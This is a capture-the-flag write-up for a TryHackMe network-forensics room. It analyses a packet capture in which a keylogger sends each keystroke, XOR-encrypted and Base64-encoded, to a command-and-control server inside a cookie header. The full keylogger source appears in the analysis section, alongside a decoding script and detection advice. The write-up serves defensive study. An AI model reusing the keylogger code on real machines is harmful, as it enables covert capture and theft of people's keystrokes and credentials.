@@ -1,0 +1,151 @@
+---
+title: Packed Light — PCAP analysis of a cookie-based covert exfiltration channel
+room: Packed Light
+difficulty: easy
+platform: TryHackMe
+vulnClass: network forensics, PCAP analysis, covert channel / data exfiltration, XOR encryption, Base64 encoding, weak cryptographic key handling
+spoilerFree: false
+---
+
+**Series:** Hacker Holidays · The Byte Lotus Hotel
+**File:** `traffic.pcapng` (1,348 packets, 41.8 seconds)
+**Category:** Forensics (Network Forensics / PCAP Analysis / Cryptography)
+
+## Observation
+
+The room's own framing:
+
+> "Tiny packets. Odd hours. Suspiciously regular. Someone's smuggling out the data equivalent of a hotel towel every night..."
+
+Something on the hotel network was making regular, suspicious connections **every single second**. The hint from @0xMia stated that her device was "pinging" port 8080 on the clock, and that the request headers were "not a real app".
+
+Regularity is the tell here. A beacon that fires once per second with no user interaction is not a real application — a real app's traffic is shaped by human behaviour. The signature to look for was a machine talking on a metronome.
+
+## Action
+
+### Phase 1 — opening the PCAP in Wireshark
+
+`traffic.pcapng` was opened in Wireshark. Filtering on **HTTP** showed the victim device `10.10.10.20` talking to a server at `10.10.10.10:8080` — an outbound connection, on a fixed one-second interval, to an external host on a non-standard port.
+
+### Phase 2 — finding the payload
+
+Looking through the sent headers revealed a strange request: `GET /temp/updates.py`
+
+Following the **HTTP Stream** produced a complete Python file — a **keylogger**.
+
+### Phase 3 — analysing the keylogger script
+
+```python
+import requests
+import base64
+from pynput import keyboard
+
+C2_URL = ""   # the server: byte-lotus-hotel.thm:8080
+
+def getkey():
+    p1 = "H0t3lSt@ff0Nly"
+    p2 = "K3epS3cr3t!"
+    return p1 + p2   # = H0t3lSt@ff0NlyK3epS3cr3t!
+
+def xor(data: bytes, key: bytes) -> bytes:
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
+
+def sendltr(character):
+    raw_bytes = character.encode('utf-8')
+    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
+    b64_string = base64.b64encode(encrypted).decode('utf-8')
+    headers = {
+        "User-Agent": "... ByteLotusClient/1.1",
+        "Cookie": f"hotel_sess_state={b64_string}"   # ← the hidden data is here
+    }
+    requests.get(C2_URL, headers=headers, timeout=0.5)
+```
+
+**Analysis:**
+
+- It listens for keystrokes (`keyboard.Listener`).
+- For each character: `XOR(char, key)` → `base64` → placed into the **Cookie** `hotel_sess_state`.
+- Every request carries **one** encrypted character — so the ~30 repeated requests were 30 characters.
+
+> **First mistake, and its correction:** the key was initially mistaken for `p1 + p2` being *the flag*. They are **the key**. The flag is scattered across the traffic itself.
+
+### Phase 4 — extracting the 30 cookies
+
+All requests were exported from Wireshark in order (`File → Export Packet Dissections → As Plain Text`), which surfaced every cookie:
+
+```
+Frame 391: hotel_sess_state=HA==
+Frame 428: hotel_sess_state=AA==
+Frame 520: hotel_sess_state=BQ==
+Frame 585: hotel_sess_state=Mw==
+... (30 cookies, one character each)
+```
+
+Note that these are single Base64 blocks in the `==` padding form — the signature of a one-byte payload, and a visible tell that Base64 is being used as an encoding layer over very short data.
+
+### Phase 5 — writing the prompt (prompt engineering practice)
+
+The decision was made to use AI to do the assembly — but in a way that was understood first, rather than firing a vague request at a model.
+
+**First prompt (75/100):** it specified the source, the 30 requests, and the `base64(xor(character, key))` formula — but it **omitted the key value and the ordering.** The script therefore had to guess, and produced the wrong result.
+
+**Revised prompt (100/100):** it added:
+
+- the key value: `p1 = "H0t3lSt@ff0Nly" + p2 = "K3epS3cr3t!"`
+- that each cookie is one character, and that the order is given by the frame numbers (391 → 1300)
+
+> **Lesson:** a good prompt is the **complete map** for the AI. The AI is not your brain — you are the one who hands it the information.
+
+### Phase 6 — the final script
+
+```python
+import base64, re
+
+p1 = "H0t3lSt@ff0Nly"
+p2 = "K3epS3cr3t!"
+key = (p1 + p2).encode("utf-8")
+
+content = open("/home/kali/THM/THMroom.txt", encoding="utf-8", errors="replace").read()
+
+pattern = re.compile(r"Frame (\d+):.*?hotel_sess_state=([A-Za-z0-9+/=]+)", re.DOTALL)
+pairs = pattern.findall(content)
+pairs.sort(key=lambda x: int(x[0]))   # order by the frame numbers
+
+flag = ""
+for frame, b64 in pairs:
+    raw = base64.b64decode(b64)
+    plain = bytes(b ^ key[i % len(key)] for i, b in enumerate(raw))
+    flag += plain.decode("utf-8", errors="replace")
+
+print(flag)
+```
+
+## Result
+
+The 30 cookies, ordered by frame number, decrypted and concatenated into the room flag:
+
+```
+[FLAG CAPTURED]
+```
+
+> "VERA is watching over you" — VERA is watching you. 👀 (a neat callback to the Byte Lotus series)
+
+## Takeaway
+
+| # | Lesson |
+|:---|:---|
+| 1 | **Covert channel:** data can be hidden in any protocol field — including Cookies. |
+| 2 | **Beacon detection:** regular traffic (once per second) is a signature of malware. |
+| 3 | **XOR with a static key = weak encryption:** trivially broken once the key is known — and here the key was sitting in the delivered script itself. |
+| 4 | **Base64 ≠ encryption:** it is encoding only, and the `==` padding gives it away instantly. |
+| 5 | **Ordering matters:** the frame numbers are the key to reassembly. Without them the output is noise. |
+| 6 | **Prompt engineering:** the AI executes — you supply the map (key + ordering + formula). |
+
+**Prevention**
+
+- Monitor for anomalous headers — oversized or malformed Cookies, unknown User-Agents.
+- Detect temporally regular beacons, not just known-bad destinations.
+- Block script execution from untrusted endpoints (`/temp/updates.py` is not where a legitimate dependency lives).
+- Apply DLP at the DNS and HTTP header layer, because by the time the payload is "encrypted" it is still plaintext to anyone holding the key.
+
+**The transferable lesson:** exfiltration tooling does not need a covert channel, a custom protocol, or anything sophisticated. A keylogger, a static XOR key, Base64, and a cookie header is the whole attack — and each of those four components is individually observable if you know what to look at.
